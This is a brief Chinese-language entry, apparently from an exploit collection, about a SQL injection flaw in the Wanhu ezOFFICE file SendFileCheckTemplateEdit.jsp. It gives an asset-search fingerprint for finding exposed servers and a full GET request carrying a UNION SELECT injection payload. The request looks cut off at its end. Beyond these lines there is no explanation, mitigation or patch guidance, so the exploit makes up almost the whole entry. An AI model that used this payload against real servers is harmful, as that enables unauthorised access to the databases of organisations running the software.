# 万户ezOFFICESendFileCheckTemplateEdit.jsp存在SQL注入漏洞

万户 ｜ SQL注入 ｜ —
- **指纹**：`app="万户网络-ezOFFICE"`
- **请求**：`GET /defaultroot/public/iWebOfficeSign/Template/SendFileCheckTemplateEdit.jsp;?RecordID=1'%20UNION%20ALL%20SELECT%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27123456%27))%2CNULL%2CNULL%2CNULL%2CNUL`